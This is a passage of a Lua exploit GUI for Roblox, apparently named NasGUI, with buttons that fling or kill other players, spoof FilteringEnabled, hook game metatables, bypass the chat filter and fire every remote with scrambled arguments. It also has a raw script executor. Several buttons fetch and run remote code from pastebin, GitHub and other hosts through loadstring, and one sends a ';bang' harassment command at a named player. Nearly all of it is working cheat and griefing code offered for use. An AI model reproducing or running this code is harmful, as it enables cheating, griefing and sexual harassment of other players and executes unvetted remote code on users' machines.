    local Workspace = game:GetService("Workspace")

    -- Duration for fling per player (seconds)
    local flingTime = 1

    -- Fling parameters
    local flingSpeed = 100 -- adjust to match your Punch Tool fling

    -- Function to fling a single player
    local function flingTarget(targetHRP)
        local startTime = tick()
        local connection
        connection = RunService.Heartbeat:Connect(function(dt)
            if tick() - startTime > flingTime then
                connection:Disconnect()
                return
            end
            -- Alternate velocity for fling
            targetHRP.Velocity = Vector3.new(flingSpeed, flingSpeed, flingSpeed)
        end)
    end

    -- Loop through all players except local
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local hrp = player.Character.HumanoidRootPart

            -- Teleport near them to ensure fling works locally
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local myHRP = LocalPlayer.Character.HumanoidRootPart
                local originalPos = myHRP.Position
                myHRP.CFrame = hrp.CFrame + Vector3.new(0, 0, 3) -- slight offset
                flingTarget(hrp)
                myHRP.CFrame = CFrame.new(originalPos)
            else
                flingTarget(hrp)
            end
        end
    end

    print("[Fling All] Activated on all players")
end},
{"Math Interrogation", function()
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local ChatEvent = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
    local Workspace = game:GetService("Workspace")
    
    -- Pick a random target
    local targets = {}
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            table.insert(targets, player)
        end
    end
    if #targets == 0 then return print("[Math Interrogation] No valid targets") end

    local target = targets[math.random(1,#targets)]
    local targetHRP = target.Character.HumanoidRootPart

    if not (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")) then return end
    local myHRP = LocalPlayer.Character.HumanoidRootPart
    local originalCFrame = myHRP.CFrame

    -- Move your character in front of them locally
    myHRP.CFrame = targetHRP.CFrame * CFrame.new(0,0,2)

    -- Function to ask a random math question
    local function askQuestion()
        local a, b = math.random(1,20), math.random(1,20)
        local answer = a + b
        local questionText = "[Math Interrogation] Hey "..target.Name..", what is "..a.." + "..b.." ?"

        -- Fire question to chat
        ChatEvent:FireServer(questionText, "All")
        print("[Math Interrogation] Asked:", questionText)

        -- Listen to local chat for answers
        local conn
        conn = Players.PlayerAdded:Connect(function() end) -- dummy to prevent error if needed
        conn = Players.LocalPlayer.Chatted:Connect(function(msg)
            -- Check if the target answered correctly (number only)
            local num = tonumber(msg)
            if num and num == answer then
                print("[Math Interrogation] Correct answer by "..target.Name)
                myHRP.CFrame = originalCFrame
                conn:Disconnect()
            elseif num then
                print("[Math Interrogation] Wrong answer by "..target.Name..", asking again...")
                task.delay(1, askQuestion)
            end
        end)
    end

    askQuestion()
end},
{"Fire TouchInterests", function()
    local Workspace = game:GetService("Workspace")
    local RunService = game:GetService("RunService")
    local toggled = false
    local connection

    local function fireTouches()
        for _, part in pairs(Workspace:GetDescendants()) do
            if part:IsA("BasePart") then
                for _, touch in pairs(part:GetTouchingParts()) do
                    -- Fire TouchInterest locally
                    for _, v in pairs(part:GetChildren()) do
                        if v:IsA("TouchTransmitter") then
                            firetouchinterest(touch, part, 0)
                            firetouchinterest(touch, part, 1)
                        end
                    end
                end
            end
        end
    end

    if not toggled then
        toggled = true
        connection = RunService.RenderStepped:Connect(fireTouches)
        print("[TouchInterests] Firing enabled")
    else
        toggled = false
        if connection then connection:Disconnect() end
        print("[TouchInterests] Firing disabled")
    end
end},
{"FE Spoofer", function()
    local Workspace = game:GetService("Workspace")
    local Players = game:GetService("Players")

    -- State
    local applied = false
    local old_index = nil
    local mt = nil

    -- Helpers to safely call executor-only APIs
    local function safe_sethidden(inst, prop, val)
        local ok, err = pcall(function()
            if setHiddenProperty then
                setHiddenProperty(inst, prop, val)
            elseif sethiddenproperty then
                sethiddenproperty(inst, prop, val)
            else
                error("no setHiddenProperty available")
            end
        end)
        return ok, err
    end

    local function safe_hook_metatable()
        local ok, got_mt = pcall(getrawmetatable, game)
        if not ok or not got_mt then
            return false, "getrawmetatable unavailable"
        end

        mt = got_mt
        local ok2 = pcall(function()
            setreadonly(mt, false)
            old_index = mt.__index
            mt.__index = newcclosure(function(self, key)
                -- Spoof Workspace.FilteringEnabled reads
                if self == Workspace and key == "FilteringEnabled" then
                    return false
                end
                -- If some code accesses game.Workspace (via game["Workspace"]), ensure it sees the same spoof
                if self == game and key == "Workspace" then
                    return Workspace
                end
                return old_index(self, key)
            end)
            setreadonly(mt, true)
        end)

        if not ok2 then
            return false, "failed to hook metatable"
        end

        return true
    end

    local function safe_unhook_metatable()
        if not mt or not old_index then return end
        pcall(function()
            setreadonly(mt, false)
            mt.__index = old_index
            setreadonly(mt, true)
        end)
    end

    -- Apply spoof (tries hidden property first, then metatable hook fallback)
    local function applySpoof()
        if applied then
            warn("[FE Spoofer] Already applied")
            return
        end

        -- Try hidden property write if executor supports it
        local ok, msg = safe_sethidden(Workspace, "FilteringEnabled", false)
        if ok then
            print("[FE Spoofer] setHiddenProperty succeeded (workspace.FilteringEnabled set locally to false).")
        else
            print("[FE Spoofer] setHiddenProperty failed or unavailable: "..tostring(msg))
        end

        -- Hook metatable so local scripts reading workspace.FilteringEnabled see false
        local hooked, err = safe_hook_metatable()
        if hooked then
            print("[FE Spoofer] Metatable hooked — local reads of Workspace.FilteringEnabled will return false.")
        else
            warn("[FE Spoofer] Metatable hook failed: "..tostring(err))
        end

        applied = true
        -- Inform user
        warn("[FE Spoofer] Spoof applied locally. NOTE: This does NOT change server enforcement. Server-side checks remain authoritative.")
    end

    local function removeSpoof()
        if not applied then
            warn("[FE Spoofer] Not applied")
            return
        end

        -- Attempt to restore metatable
        safe_unhook_metatable()

        -- Can't reliably undo setHiddenProperty in all executors; attempt if available
        pcall(function()
            if setHiddenProperty then
                setHiddenProperty(Workspace, "FilteringEnabled", Workspace.FilteringEnabled)
            elseif sethiddenproperty then
                sethiddenproperty(Workspace, "FilteringEnabled", Workspace.FilteringEnabled)
            end
        end)

        applied = false
        print("[FE Spoofer] Removed local spoof (best-effort). Server still authoritative.")
    end

    -- Toggle UI-less: call applySpoof() to enable, removeSpoof() to disable.
    -- For NasGUI button behavior, toggle on first click, disable on second click:
    if not applied then
        applySpoof()
    else
        removeSpoof()
    end
end},
{"Client-Side Chat Filter Remover", function()
    local success, TextChatService = pcall(function()
        return game:GetService("TextChatService")
    end)
    if not success or not TextChatService then
        warn("[ChatFilterRemover] TextChatService unavailable in this game")
        return
    end

    -- Hook the message processing locally
    local mt = getrawmetatable(TextChatService)
    setreadonly(mt,false)
    local old_index = mt.__index
    mt.__index = newcclosure(function(self,key)
        if key == "OnIncomingMessage" then
            -- Override to bypass filtering
            return function(msgObj)
                -- Display raw message locally
                -- You can also add a custom GUI here if desired
                print("[Unfiltered Chat] "..msgObj.Text)
                return msgObj
            end
        end
        return old_index(self,key)
    end)
    setreadonly(mt,true)

    print("[ChatFilterRemover] Local chat filter bypass active. Only affects your client.")
end},
{"Show FilteringEnabled (DEX)", function()
    local Workspace = game:GetService("Workspace")

    -- Safely try setHiddenProperty
    local ok, err = pcall(function()
        if setHiddenProperty then
            setHiddenProperty(Workspace, "FilteringEnabled", false)
        elseif sethiddenproperty then
            sethiddenproperty(Workspace, "FilteringEnabled", false)
        else
            error("setHiddenProperty unavailable")
        end
    end)

    if ok then
        print("[FE State] Workspace.FilteringEnabled set locally to false (Dex will see this).")
    else
        warn("[FE State] Failed: "..tostring(err))
    end

    -- Hook metatable so local scripts also see false
    local mt = getrawmetatable(game)
    setreadonly(mt,false)
    local old_index = mt.__index
    mt.__index = newcclosure(function(self,key)
        if self == Workspace and key == "FilteringEnabled" then
            return false
        end
        return old_index(self,key)
    end)
    setreadonly(mt,true)

    print("[FE State] Local reads of Workspace.FilteringEnabled now return false")
end},
{"RBXNet FE Bypass", function()
    pcall(function()
        local function spoofArgs(args)
            local newArgs = {}
            for i, arg in ipairs(args) do
                if type(arg) == "number" then
                    newArgs[i] = math.random(-100, 100)
                elseif type(arg) == "string" then
                    newArgs[i] = "NasGUI_Pwned_" .. arg
                elseif type(arg) == "boolean" then
                    newArgs[i] = not arg
                else
                    newArgs[i] = arg
                end
            end
            return newArgs
        end
        for _, obj in pairs(game:GetDescendants()) do
            if obj:IsA("RemoteEvent") then
                pcall(function()
                    local connections = getconnections(obj.OnServerEvent)
                    for _, conn in pairs(connections) do
                        if conn.Function then
                            local originalFunc = conn.Function
                            conn:Disable()
                            conn.Function = function(...)
                                local args = spoofArgs({...})
                                return originalFunc(unpack(args))
                            end
                            conn:Enable()
                        end
                    end
                    obj:FireServer(unpack(spoofArgs({nil})))
                end)
            elseif obj:IsA("RemoteFunction") then
                pcall(function()
                    obj:InvokeServer(unpack(spoofArgs({nil})))
                end)
            end
        end
        warn("RBXNet FE Bypass attempt complete! Spoofed remote arguments and fired all remotes.")
    end)
end},
{"Infinite Yield", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end},
{"TOPK3K", function()
    loadstring(game:HttpGet("https://gist.githubusercontent.com/nosyliam/13a8b0aaf95bf30405e4f1dbb87d5be4/raw/cde5ffc846aec67e14b08878fb286baae21b91c9/tksrc.lua"))()
end}
}


for i, item in ipairs(buttons) do
    createButton(scrollMain, item[1], (i-1)*50, item[2])
end
scrollMain.CanvasSize = UDim2.new(0, 0, 0, #buttons * 50)


-- Executor Tab Content
local inputBox = Instance.new("TextBox", containerExec)
inputBox.Size = UDim2.new(1, 0, 0.7, 0)
inputBox.Position = UDim2.new(0, 0, 0, 0)
inputBox.Text = "-- Script goes here."
inputBox.MultiLine = true
inputBox.TextXAlignment = Enum.TextXAlignment.Left
inputBox.TextYAlignment = Enum.TextYAlignment.Top
inputBox.ClearTextOnFocus = false
inputBox.Font = Enum.Font.Code
inputBox.TextSize = 14
inputBox.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
inputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
inputBox.TextWrapped = true
inputBox.ZIndex = 1


local execButton = Instance.new("TextButton", containerExec)
execButton.Size = UDim2.new(1, 0, 0, 40)
execButton.Position = UDim2.new(0, 0, 0.72, 10)
execButton.Text = "EXECUTE"
execButton.BackgroundColor3 = Color3.fromRGB(128, 0, 0)
execButton.TextColor3 = Color3.fromRGB(255, 255, 255)
execButton.Font = Enum.Font.GothamBold
execButton.TextSize = 16
execButton.ZIndex = 1
execButton.MouseButton1Click:Connect(function()
    pcall(function()
        loadstring(inputBox.Text)()
    end)
end)


-- Misc Tab Content (continued from playerInput)
local playerInput = Instance.new("TextBox", containerMisc)
playerInput.Size = UDim2.new(1, -20, 0, 30)
playerInput.Position = UDim2.new(0, 10, 0, 0)
playerInput.PlaceholderText = "Enter Player Name"
playerInput.Text = ""
playerInput.Font = Enum.Font.Gotham
playerInput.TextSize = 14
playerInput.TextColor3 = Color3.fromRGB(255, 255, 255)
playerInput.BackgroundColor3 = Color3.fromRGB(128, 0, 0)
playerInput.BorderColor3 = Color3.fromRGB(255, 50, 50)
playerInput.ZIndex = 1


-- ScrollingFrame for Misc Tab
local scrollMisc = Instance.new("ScrollingFrame", containerMisc)
scrollMisc.Size = UDim2.new(1, 0, 1, -40) -- Adjusted for playerInput
scrollMisc.Position = UDim2.new(0, 0, 0, 40)
scrollMisc.BackgroundTransparency = 1
scrollMisc.ScrollBarThickness = 5
scrollMisc.ScrollBarImageColor3 = Color3.fromRGB(255, 50, 50)
scrollMisc.CanvasSize = UDim2.new(0, 0, 0, 0) -- Auto-adjusted later
scrollMisc.ZIndex = 1


local miscLayout = Instance.new("UIListLayout", scrollMisc)
miscLayout.Padding = UDim.new(0, 10)
miscLayout.SortOrder = Enum.SortOrder.LayoutOrder


-- Helper to find player by partial name
local function findPlayer(name)
    for _, p in pairs(game.Players:GetPlayers()) do
        if p.Name:lower():sub(1, #name) == name:lower() then
            return p
        end
    end
end


-- Misc Tab Buttons Helper
local function createMiscButton(yPos, text, callback)
    local button = Instance.new("TextButton", scrollMisc)
    button.Size = UDim2.new(1, -20, 0, 30)
    button.Position = UDim2.new(0, 10, 0, yPos)
    button.Text = text
    button.Font = Enum.Font.GothamBold
    button.TextSize = 14
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.BackgroundColor3 = Color3.fromRGB(128, 0, 0)
    button.BorderColor3 = Color3.fromRGB(255, 50, 50)
    button.ZIndex = 1
    button.MouseButton1Click:Connect(callback)
    return button
end


-- Stat Controls Helper
local function createMiscEntry(yPos, placeholderText, buttonText, callback)
    local textBox = Instance.new("TextBox", scrollMisc)
    textBox.Size = UDim2.new(0, 200, 0, 30)
    textBox.Position = UDim2.new(0, 10, 0, yPos)
    textBox.PlaceholderText = placeholderText
    textBox.Text = ""
    textBox.Font = Enum.Font.Gotham
    textBox.TextSize = 14
    textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    textBox.BackgroundColor3 = Color3.fromRGB(128, 0, 0)
    textBox.BorderColor3 = Color3.fromRGB(255, 50, 50)
    textBox.ZIndex = 1


    local button = Instance.new("TextButton", scrollMisc)
    button.Size = UDim2.new(0, 160, 0, 30)
    button.Position = UDim2.new(0, 220, 0, yPos)
    button.Text = buttonText
    button.Font = Enum.Font.GothamBold
    button.TextSize = 14
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.BackgroundColor3 = Color3.fromRGB(128, 0, 0)
    button.BorderColor3 = Color3.fromRGB(255, 50, 50)
    button.ZIndex = 1


    button.MouseButton1Click:Connect(function()
        local val = tonumber(textBox.Text)
        if val then callback(val) end
    end)
end


-- Player Commands
local yPos = 0

-- Bang Player
createMiscEntry(yPos, "Player Name", "Bang Player", function(targetName)
    local target = findPlayer(targetName)
    if target then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
        task.wait(1)
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(";bang "..target.Name.." 5", "All")
    else
        warn("Player not found")
    end
end)
yPos += 40

-- Fling Player
createMiscEntry(yPos, "Player Name", "Fling Player", function(targetName)
    local target = findPlayer(targetName)
    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
        local hrp = target.Character.HumanoidRootPart
        local body = Instance.new("BodyVelocity", hrp)
        body.Velocity = Vector3.new(9999, 9999, 9999)
        body.MaxForce = Vector3.new(1e9, 1e9, 1e9)
        game.Debris:AddItem(body, 0.2)
    else
        warn("Player not found or missing HumanoidRootPart")
    end
end)
yPos += 40

-- Teleport to Player
createMiscEntry(yPos, "Player Name", "Teleport to Player", function(targetName)
    local target = findPlayer(targetName)
    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
        LocalPlayer.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(2,0,0)
    else
        warn("Player not found or missing HumanoidRootPart")
    end
end)
yPos += 40

-- WalkSpeed
createMiscEntry(yPos, "WalkSpeed amount", "Set Speed", function(val)
    LocalPlayer.Character.Humanoid.WalkSpeed = val
end)
yPos += 40

-- JumpPower
createMiscEntry(yPos, "JumpPower amount", "Set Jumppower", function(val)
    LocalPlayer.Character.Humanoid.JumpPower = val
end)
yPos += 40

-- Gravity
createMiscEntry(yPos, "Gravity amount", "Set Gravity", function(val)
    game.Workspace.Gravity = val
end)
yPos += 40

-- Kill Player
createMiscEntry(yPos, "Player Name", "Kill Player", function(targetName)
    local target = findPlayer(targetName)
    if target and target.Character and target.Character:FindFirstChild("Humanoid") then
        target.Character.Humanoid.Health = 0
    else
        warn("Player not found or missing Humanoid")
    end
end)
yPos += 40

-- Grab Knife
createMiscButton(yPos, "Grab Knife V4", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/Xt6s2v4v"))()
end)
yPos += 40

-- Rainbow Carpet
createMiscButton(yPos, "Rainbow Carpet", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fly-Tool-34005"))()
end)
yPos += 40

-- Hyperlaser Gun
createMiscButton(yPos, "Hyperlaser Gun", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/hxXxYjth"))()
end)
yPos += 40

-- Anti-AFK
createMiscButton(yPos, "Anti-AFK", function()
    local VirtualUser = game:GetService("VirtualUser")
    game:GetService("Players").LocalPlayer.Idled:Connect(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end)
end)
yPos += 40

-- Mesh Spam
createMiscButton(yPos, "Mesh Spam", function()
    local function spamMeshes(character)
        local meshIds = {
            "http://www.roblox.com/asset/?id=128639186",
            "http://www.roblox.com/asset/?id=128639252",
            "http://www.roblox.com/asset/?id=128639292",
            "http://www.roblox.com/asset/?id=128639354"
        }
        while character and character.Parent do
            for _, part in pairs(character:GetChildren()) do
                if part:IsA("BasePart") then
                    local oldMesh = part:FindFirstChildWhichIsA("SpecialMesh") 
                                  or part:FindFirstChildWhichIsA("BlockMesh") 
                                  or part:FindFirstChildWhichIsA("CylinderMesh")
                    if oldMesh then oldMesh:Destroy() end
                    local newMesh = Instance.new("SpecialMesh", part)
                    newMesh.MeshId = meshIds[math.random(1,#meshIds)]
                    newMesh.Scale = Vector3.new(1,1,1)
                end
            end
            task.wait(0.5)
        end
    end
    local character = game.Players.LocalPlayer.Character
    if character then
        spawn(function() spamMeshes(character) end)
    end
end)
yPos += 40

-- Clone Yourself
createMiscButton(yPos, "Clone Yourself", function()
    local plr = LocalPlayer
    if plr and plr.Character then
        local clone = plr.Character:Clone()
        clone.Parent = workspace
        clone:SetPrimaryPartCFrame(plr.Character:GetPrimaryPartCFrame() + Vector3.new(3,0,0))
    end
end)
yPos += 40

-- Admin Rank Faker
createMiscButton(yPos, "Admin Rank Faker", function()
    local plr = LocalPlayer
    if plr then
        plr:SetAttribute("IsAdmin", true)
        plr.Name = "[Admin] "..plr.Name
    end
end)
yPos += 40

-- Set FOV
createMiscButton(yPos, "Set FOV", function()
    local input = tonumber(LocalPlayer:PromptInput("Enter FOV (default 70)"))
    if input and input > 0 and input <= 120 then
        workspace.CurrentCamera.FieldOfView = input
    else
        warn("[Misc] Invalid FOV value")
    end
end)
yPos += 40

-- Set Max Zoom
createMiscButton(yPos, "Set Max Zoom", function()
    local input = tonumber(LocalPlayer:PromptInput("Enter Max Camera Zoom (default 12)"))
    if input and input > 0 then
        workspace.CurrentCamera.CameraMaxZoomDistance = input
    else
        warn("[Misc] Invalid Zoom value")
    end
end)
yPos += 40

-- Local Time
createMiscButton(yPos, "Set Local Time", function()
    local input = LocalPlayer:PromptInput("Enter Time of Day (HH:MM:SS)")
    if input and tostring(input):match("%d+:%d+:%d+") then
        game:GetService("Lighting").TimeOfDay = input
    else
        warn("[Misc] Invalid Time format")
    end
end)
yPos += 40

-- Streamer Mode
createMiscButton(yPos, "Streamer Mode", function()
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer

    if _G.StreamerMode then
        for _, gui in pairs(game:GetService("CoreGui"):GetDescendants()) do
            if gui:IsA("TextLabel") or gui:IsA("TextButton") then
                if gui:GetAttribute("StreamerOriginalText") then
                    gui.Text = gui:GetAttribute("StreamerOriginalText")
                    gui:SetAttribute("StreamerOriginalText", nil)
                end
            end
        end
        _G.StreamerMode = false
        print("[Misc] Streamer Mode disabled.")
    else
        _G.StreamerMode = true
        local fakeName = "Player_"..math.random(1000,9999)
        for _, gui in pairs(game:GetService("CoreGui"):GetDescendants()) do
            if gui:IsA("TextLabel") or gui:IsA("TextButton") then
                if gui.Text == LocalPlayer.Name then
                    gui:SetAttribute("StreamerOriginalText", gui.Text)
                    gui.Text = fakeName
                end
            end
        end
        print("[Misc] Streamer Mode enabled. Fake name: "..fakeName)
    end
end)
yPos += 40

-- Auto-resize Misc ScrollingFrame
miscLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    scrollMisc.CanvasSize = UDim2.new(0, 0, 0, miscLayout.AbsoluteContentSize.Y)
end)
pcall(init)
